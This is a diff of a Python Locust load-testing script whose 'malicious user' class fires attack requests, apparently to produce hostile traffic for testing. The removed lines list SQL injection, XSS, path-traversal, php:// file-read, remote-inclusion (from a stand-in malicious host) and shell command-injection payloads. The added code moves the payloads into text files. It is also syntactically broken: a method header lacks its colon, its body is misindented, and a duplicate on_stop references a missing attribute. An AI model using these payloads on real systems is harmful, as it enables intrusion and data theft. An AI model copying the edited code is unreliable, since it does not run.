@@ -10,6 +10,8 @@ from locust.shape import LoadTestShape
 from datetime import datetime
 import gevent
 import yaml
+import urllib.parse
+import secrets
 
 config_path = "/mnt/locust/locust_config.yaml"
 with open(config_path, "r") as config_file:
@@ -93,45 +95,56 @@ class DynamicMaliciousUser(HttpUser):
     def on_stop(self):
         user_manager.remove_user(self)
 
+    def on_stop(self):
+        self.__class__.instances.remove(self)
+
+    
     @task(2)
-    def sql_injection_attempt(self):
-        if not self.is_active:
-            return
-        payloads = [
-            "' OR '1'='1",
-            "' UNION SELECT username, password FROM users--",
-            "admin'--",
-            "1; DROP TABLE users--",
-            "' OR 1=1--",
-            "' UNION SELECT null, version()--",
-            "' AND 1=2 UNION SELECT null, null--",
-            "' OR 'x'='x'--",
-            "1; EXEC xp_cmdshell('ping 127.0.0.1')--",
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "../../../../etc/passwd",
-            "../../../../etc/passwd%00",
-            "php://filter/convert.base64-encode/resource=index.php",
-            "http://malicious-website.com/malicious-script.php",
-            "1; ls -la",
-            "1 && whoami",
-        ]
-        payload = random.choice(payloads)
-        self._log_request("GET", f"/products?id={payload}", None, "sql_injection")
+    def sql_injection_attempt(self)
+     if not self.is_active:
+        return
+    # Read payloads from an external file
+    with open('SQL.txt', 'r') as file:
+        payloads = [line.strip() for line in file.readlines()]
+    payload = random.choice(payloads)
+    self._log_request("GET", f"/products?id={payload}", None, "sql_injection")
 
     @task(2)
     def xss_attempt(self):
         if not self.is_active:
             return
-        payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<svg onload=alert('XSS')>",
-            "'\"><script>alert('XSS')</script>",
-        ]
-        payload = random.choice(payloads)
-        self._log_request("POST", "/search", {"q": payload}, "xss")
+        payload_files = ['stored_xss.txt', 'reflected_xss.txt', 'dom_xss.txt']
+
+        selected_file = secrets.choice(payload_files)
+
+        try:
+            # Load payloads from the selected text file
+            with open(selected_file, 'r') as file:
+                payloads = [line.strip() for line in file if line.strip()]
+        except Exception as e:
+            # Handle exceptions (e.g., file not found)
+            print(f"Error loading payloads from {selected_file}: {e}")
+            return
+        payload = secrets.choice(payloads)
+
+        encoded_payload = urllib.parse.quote(payload)
+
+        # Adjust the request based on the selected attack type
+        if selected_file == 'stored_xss.txt':
+            data = {"comment": payload}
+            self._log_request("POST", "/submit_comment", data, "xss_stored")
+
+        elif selected_file == 'reflected_xss.txt':
+            url = f"/search?q={encoded_payload}"
+            self._log_request("GET", url, None, "xss_reflected")
+
+        elif selected_file == 'dom_xss.txt':
+            url = f"/page#payload={encoded_payload}"
+            self._log_request("GET", url, None, "xss_dom")
+
+        else:
+            print(f"Unknown payload file selected: {selected_file}")
+            return
 
     @task(2)
     def brute_force_login(self):
@@ -322,7 +335,6 @@ class DynamicMaliciousUser(HttpUser):
             "request_body": data if data else None,
         }
         json_logger.info(json.dumps(log_entry))
-
 
 enabled_user_classes = []
 
